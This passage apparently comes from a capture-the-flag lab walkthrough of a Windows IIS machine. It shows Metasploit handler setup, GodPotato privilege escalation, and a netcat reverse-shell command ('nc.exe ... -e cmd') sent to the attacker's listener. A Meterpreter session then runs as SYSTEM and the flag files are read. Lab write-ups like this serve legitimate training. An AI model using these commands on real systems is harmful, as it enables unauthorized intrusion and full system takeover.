+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/handler) > set LHOST 10.0.2.15
+LHOST => 10.0.2.15
+msf6 exploit(multi/handler) > set LPORT 6060
+LPORT => 6060
+msf6 exploit(multi/handler) > exploit -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+
+
+
+					GAINING ADMIN PRIVILEGE
+
+
+-----now lets use GodPotato------
+
+
+c:\inetpub\wwwroot>.\GodPotato-NET4.exe -cmd "cmd /c nc.exe 10.0.2.15 6060 -e cmd"
+.\GodPotato-NET4.exe -cmd "cmd /c nc.exe 10.0.2.15 6060 -e cmd"
+[*] CombaseModule: 0x140706959458304
+[*] DispatchTable: 0x140706961775856
+[*] UseProtseqFunction: 0x140706961151136
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] CreateNamedPipe \\.\pipe\d735fa30-9ddc-40c0-9aa4-757ef0f1fdde\pipe\epmapper
+[*] Trigger RPCSS
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 00003002-0088-ffff-ba5a-9d2485d9d007
+[*] DCOM obj OXID: 0xdaa1ec2fcb7341e2
+[*] DCOM obj OID: 0xb54e2cc44c6e334c
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\Servicio de red
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 736 Token:0x832  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 2600
+
+
+
+-----we go to msfconsole and boom, connection is successful, we hve become admin-----
+
+
+[*] Started reverse TCP handler on 10.0.2.15:6060 
+msf6 exploit(multi/handler) > [*] Sending stage (176198 bytes) to 10.0.2.23
+sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                   Connection
+  --  ----  ----                     -----------                   ----------
+  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ SIMPLE  10.0.2.15:6060 -> 10.0.2.23:49746 (10.0.2.23
+                                                                   )
+
+msf6 exploit(multi/handler) > [*] Meterpreter session 1 opened (10.0.2.15:6060 -> 10.0.2.23:49746) at 2024-03-22 16:37:50 +0300
+sessions 1
+[*] Starting interaction with 1...
+
+meterpreter > shell
+Process 1580 created.
+Channel 1 created.
+Microsoft Windows [Versi�n 10.0.17763.107]
+(c) 2018 Microsoft Corporation. Todos los derechos reservados.
+
+c:\inetpub\wwwroot>whoami
+whoami
+nt authority\system
+
+c:\inetpub\wwwroot>cd /Users
+cd /Users
+
+c:\Users>dir
+dir
+ El volumen de la unidad C no tiene etiqueta.
+ El n�mero de serie del volumen es: 26CD-AE41
+
+ Directorio de c:\Users
+
+06/03/2024  13:37    <DIR>          .
+06/03/2024  13:37    <DIR>          ..
+08/10/2023  20:46    <DIR>          .NET v4.5
+08/10/2023  20:46    <DIR>          .NET v4.5 Classic
+08/10/2023  23:11    <DIR>          Administrador
+06/03/2024  13:37    <DIR>          bogo
+18/03/2024  22:59    <DIR>          marcos
+26/09/2023  14:11    <DIR>          Public
+               0 archivos              0 bytes
+               8 dirs  46.266.793.984 bytes libres
+
+c:\Users>cd marcos/Desktop
+
+c:\Users\marcos\Desktop>type user.txt
+type user.txt
+----User Flag----
+
+
+c:\Users\marcos\Desktop>cd /Users/Administrador
+cd /Users/Administrador
+
+c:\Users\Administrador>cd Desktop
+cd Desktop
+
+c:\Users\Administrador\Desktop>dir
+dir
+ El volumen de la unidad C no tiene etiqueta.
+ El n�mero de serie del volumen es: 26CD-AE41
+
+ Directorio de c:\Users\Administrador\Desktop
+
+26/09/2023  14:11    <DIR>          .
+26/09/2023  14:11    <DIR>          ..
+08/10/2023  23:07                66 root.txt
+               1 archivos             66 bytes
+               2 dirs  46.266.793.984 bytes libres
+
+c:\Users\Administrador\Desktop>type root.txt
+type root.txt
+----Root Flag----
